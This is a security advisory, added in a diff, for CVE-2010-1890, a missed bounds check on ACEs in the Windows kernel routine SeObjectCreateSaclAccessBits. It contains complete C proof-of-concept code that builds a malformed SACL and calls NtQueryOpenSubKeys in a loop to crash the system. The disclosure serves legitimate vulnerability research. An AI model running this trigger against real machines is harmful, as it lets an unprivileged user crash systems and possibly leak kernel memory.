@@ -1,0 +1,195 @@
+Microsoft Windows nt!SeObjectCreateSaclAccessBits() missed ACE bounds checks
+----------------------------------------------------------------------------
+
+CVE-2010-1890
+
+An ACE is an Access Control Entry, of which many may be attached to an ACL
+(Access Control List). On Windows, an ACL can be of type SACL or DACL
+(Discretionary vs System). The routine nt!SeObjectCreateSaclAccessBits omits
+proper bounds checking, allowing an attacker who specifies a pathological ACE
+size and count to disrupt the operation of the system.
+
+An ACL structure looks like this
+
+kd> dt nt!_ACL
+   +0x000 AclRevision      : UChar
+   +0x001 Sbz1             : UChar
+   +0x002 AclSize          : Uint2B
+   +0x004 AceCount         : Uint2B
+   +0x006 Sbz2             : Uint2B
+
+And will have the specfied number of entries attached to it. An ACE has a header,
+
+typedef struct _ACE_HEADER {
+    BYTE AceType;
+    BYTE AceFlags;
+    WORD AceSize;
+} ACE_HEADER, *PACE_HEADER;
+
+http://msdn.microsoft.com/en-us/library/aa374919%28VS.85%29.aspx
+
+Followed by some type specific data, such as SID and so on. By specifying
+pathological ACE configuration, we can cause a fatal system error.
+
+--------------------
+Affected Software
+------------------------
+
+At least Microsoft Windows 7 is affected.
+
+--------------------
+Consequences
+-----------------------
+
+This issue may be of interest to security professionals but end users are
+unlikely to be affected by this issue. An unprivileged user may be able to
+cause a bugcheck, or possibly leak kernel memory.
+
+Example code to trigger this vulnerability is available below.
+
+#ifndef WIN32_NO_STATUS
+# define WIN32_NO_STATUS    // I prefer working with ntstatus.h
+#endif
+#include <windows.h>
+#include <assert.h>
+#include <stdio.h>
+#include <winerror.h>
+#include <winternl.h>
+#include <stddef.h>
+#include <winnt.h>
+#ifdef WIN32_NO_STATUS
+# undef WIN32_NO_STATUS
+#endif
+#include <ntstatus.h>
+
+#pragma comment(lib, "advapi32")
+
+PVOID AllocBuffer(ULONG Size);
+
+// macro below copied from ntdef.h
+
+#define InitializeObjectAttributes( p, n, a, r, s ) {   \
+    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
+    (p)->RootDirectory = r;                             \
+    (p)->Attributes = a;                                \
+    (p)->ObjectName = n;                                \
+    (p)->SecurityDescriptor = s;                        \
+    (p)->SecurityQualityOfService = NULL;               \
+    }
+
+#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
+
+int main(int argc, char **argv)
+{
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    SECURITY_DESCRIPTOR SecurityDescriptor;
+    UNICODE_STRING ObjectName;
+    FARPROC NtQueryOpenSubKeys;
+    ULONG HandleCount;
+    PACL Sacl;
+    ACE_HEADER Ace;
+
+    NtQueryOpenSubKeys = GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtQueryOpenSubKeys");
+
+    InitializeObjectAttributes(&ObjectAttributes,
+                               &ObjectName,
+                               OBJ_FORCE_ACCESS_CHECK,
+                               NULL,
+                               &SecurityDescriptor);
+
+    fprintf(stderr, "NtQueryOpenSubKeys@%p\n", NtQueryOpenSubKeys);
+
+    ZeroMemory(&ObjectName, sizeof(ObjectName));
+
+    Sacl            = AllocBuffer(0x800);
+    Ace.AceType     = SYSTEM_MANDATORY_LABEL_ACE_TYPE;
+    Ace.AceFlags    = INHERIT_ONLY_ACE;
+
+    InitializeSecurityDescriptor(&SecurityDescriptor, SECURITY_DESCRIPTOR_REVISION);
+    SetSecurityDescriptorSacl(&SecurityDescriptor, TRUE, Sacl, FALSE);
+    InitializeAcl(Sacl, 0x800, ACL_REVISION);
+
+    // Begin malformed
+    Sacl->AceCount   = 0x1000;
+    Ace.AceSize      = 0x1000;
+
+    // Append ACE Header (body not necessary to demonstrate bug)
+    // &Sacl[1] is the first byte after the ACL, where the first ACE begins.
+    CopyMemory(&Sacl[1], &Ace, sizeof(Ace));
+
+    while (TRUE) {
+        NtQueryOpenSubKeys(&ObjectAttributes, &HandleCount);
+        Sleep(0x1);
+    }
+
+    return 0;
+}
+
+#ifndef PAGE_SIZE
+# define PAGE_SIZE 0x1000
+#endif
+
+// Quick routine to make a guarded buffer, no error checking etc. whatever.
+PVOID AllocBuffer(ULONG Size)
+{
+    ULONG GuardBufSize;
+    PBYTE GuardBuf;
+    ULONG ProtBits;
+
+    // Round size up to the next PAGE_SIZE
+    GuardBufSize = (Size + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
+
+    // Add one page to be a guardbuf
+    GuardBufSize = GuardBufSize + PAGE_SIZE;
+
+    // Allocate a buffer with a GuardPage
+    GuardBuf = VirtualAlloc(NULL,
+                            GuardBufSize,
+                            MEM_COMMIT | MEM_RESERVE,
+                            PAGE_READWRITE);
+
+    // Make the last page NOACCESS
+    VirtualProtect(GuardBuf + GuardBufSize - PAGE_SIZE,
+                   PAGE_SIZE,
+                   PAGE_NOACCESS,
+                   &ProtBits);
+
+    // Calculate where buffer should be, so that Buffer[Size] AVs.
+    return GuardBuf + GuardBufSize - PAGE_SIZE - Size;
+}
+
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+$1$90AiGoxp$wyzZGQ6owkRG6OxPErj6M/
+$1$7.qXQkxE$5Zc1zQndJpGdoe1RF4Br1.
+$1$IPYBMipO$/HhHCPgulV/E0pgSvU1710
+$1$ULymMO9x$NVMLjZe8i25ajEfnsRowA.
+$1$8a/c6DLm$JDAFGdhEzIj2DR7RYC2gi.
+
+And all the other elite people I've worked with (sorry, too many to generate!).
+
+-------------------
+Notes
+-----------------------
+
+Approximate time to fix was 150 days. 
+
+-------------------
+References
+-----------------------
+
+- http://msdn.microsoft.com/en-us/library/aa374919%28VS.85%29.aspx
+  ACE_HEADER
+- http://msdn.microsoft.com/en-us/library/aa374931%28v=VS.85%29.aspx
+  ACL
+- http://msdn.microsoft.com/en-us/library/ms809962.aspx
+  OBJ_FORCE_ACCESS_CHECK
